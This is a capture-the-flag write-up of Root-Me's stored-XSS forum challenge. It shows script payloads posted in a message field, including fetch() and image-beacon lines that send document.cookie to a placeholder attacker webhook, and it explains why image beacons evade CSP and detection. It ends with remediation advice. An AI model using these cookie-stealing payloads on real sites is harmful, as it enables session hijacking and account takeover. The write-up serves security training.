# Stored XSS — Root-Me Forum v0.001

### Lab Link
[RootMe - XSS Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

Oct 19, 2026 · @Angelo

## Target & Objective

**Challenge:** Root-Me — Web Client-side, "Forum v0.001" **Vulnerability class:** Stored XSS **Vulnerable field:** The forum's "Message" text area (posted content is stored server-side and rendered unsanitized to every visitor, including the admin/bot that reviews posts).

**Goal:** Go beyond proving the XSS fires and actually steal the admin's session cookie, by getting a payload to run in the admin's browser and send `document.cookie` to an attacker-controlled endpoint (webhook.site).

## Step 1 — Confirming the Vulnerability

**Payload submitted in the Message field:**

```html
<script>alert(document.cookie)</script>
```

**Result:** Submitting the post and then viewing the forum thread triggered a JavaScript `alert()` popup showing the page's cookie. This confirms the application stores raw HTML/JS from the Message field and renders it without sanitization or encoding — a classic **stored XSS**, since the payload persists in the database and fires for every visitor who loads the "Posted posts" page, not just the original poster.

This is the baseline proof-of-concept step: before trying to weaponize the bug, confirm script execution with something harmless and visible (`alert`).

## Step 2 — First Exfiltration Attempt (fetch)

**Payload submitted:**

```html
<script>
  fetch("https://WEBHOOK-UNIQUE-URL/exfil?data=" + encodeURIComponent(document.cookie));
</script>
```

**Result:** A GET request did land on the webhook.site bin, but the captured `data` parameter only contained Google Analytics tracking cookies (`_ga`, `_ga_SRYSKX0J7`), not an admin session cookie. The hit also came from a request with no meaningful `Request Content` body and generic headers — nothing identifying it as coming from a privileged admin session.

This is "noise" for a few likely reasons:

- It may have been the **automated Root-Me bot/scanner** visiting the thread with its own ordinary cookies, not an authenticated admin session with elevated privileges.
- `fetch()` is a **CORS-governed** request. Depending on the target site's Content-Security-Policy (`connect-src`) or the browser enforcing CORS preflight rules for cross-origin `fetch`, the request can be blocked, stripped of credentials, or silently fail before reaching an attacker's listener with the real cookie — so even when a request does arrive, it isn't guaranteed to carry the full, intended cookie jar.

## Step 3 — Working Exfiltration (Image beacon)

**Payload submitted:**

```html
<script>new Image().src = "https:/WEBHOOK-UNIQUE-URL/exfil?data=" + encodeURIComponent(document.cookie);</script>
```

**Result:** This hit landed from a different IP/location and Request ID than the Step 2 hit, and the captured `data` parameter contained `ADMIN_COOKIE=URL-Encoded` — a real, named admin session cookie value which is url encoded, not generic analytics noise. This confirms the stored XSS was triggered by the **admin's browser/bot visiting the forum**, and the payload successfully exfiltrated their session cookie to the attacker-controlled webhook.

## *Completing the Lab:*
As the Admin Cookie is `URL Encoded`, decode it then submit it in the lab as the `Password`

---

## Why Image() Succeeded Where fetch() Didn't

| Aspect | `fetch()` | `new Image().src` |
| --- | --- | --- |
| Request type | XMLHttpRequest-style AJAX call | Simple GET via the HTML `<img>` loading mechanism |
| CORS / CSP enforcement | Subject to CORS and `Content-Security-Policy: connect-src` restrictions; a strict CSP can block or neuter the call | Governed by `img-src` (if set at all); many sites' CSPs are far looser or unset for image loads, and legacy image requests are not subject to the CORS preflight that `fetch`/`XHR` are |
| Visibility to defenses | More likely to be flagged/blocked by CSP, WAFs, or browser extensions watching for AJAX exfiltration | Blends in as an ordinary image load (the kind of request that happens constantly on any page), so it's less likely to be inspected or blocked |
| Reliability in the target context | Request may have been blocked, redirected, or stripped, or simply came from a non-privileged bot visit, before a real cookie reached the listener | Request fired cleanly as a normal resource fetch and carried the full `document.cookie` string, including the admin-specific cookie |

**Bottom line:** both payloads are functionally doing the same thing — reading `document.cookie` and sending it as a URL query parameter to an external endpoint. The difference isn't the goal, it's the **delivery mechanism**. An `<img>`/`Image()` beacon is often the more reliable choice for stored-XSS cookie theft because it rides on the browser's basic resource-loading behavior rather than the more heavily policed `fetch`/XHR APIs, and it's less likely to be caught by Content-Security-Policy rules or anomaly detection that specifically watch for outbound AJAX calls.

## Takeaways

- **Always escalate from a proof-of-concept.** An `alert()` only proves script execution; it doesn't prove impact. Moving to a cookie-exfiltration payload is what demonstrates real-world exploitability (session hijacking, account takeover).
- **If one exfil technique gives noisy/wrong results, try an alternate delivery mechanism** before assuming the vulnerability isn't exploitable. `fetch`/XHR beacons can be blocked or filtered by CSP/CORS; an image-based beacon (`new Image().src = ...`, or equivalently an injected `<img src=...>` tag) is a simpler, more universally effective exfiltration primitive for stored XSS.
- **Validate captured data before declaring success.** The first hit (Step 2) looked like a win at first glance (a request did arrive) but closer inspection of the `data` parameter showed only generic analytics cookies — a reminder to actually read the captured payload, not just confirm that *a* request landed.

**Remediation (for the app owner):** sanitize/encode all user-supplied input before rendering it (HTML-entity encode `<`, `>`, `&`, quotes), apply a strict Content-Security-Policy (e.g. disallow inline `<script>`, restrict `connect-src`/`img-src` to trusted origins), and mark session cookies `HttpOnly` so `document.cookie` cannot read them client-side at all.
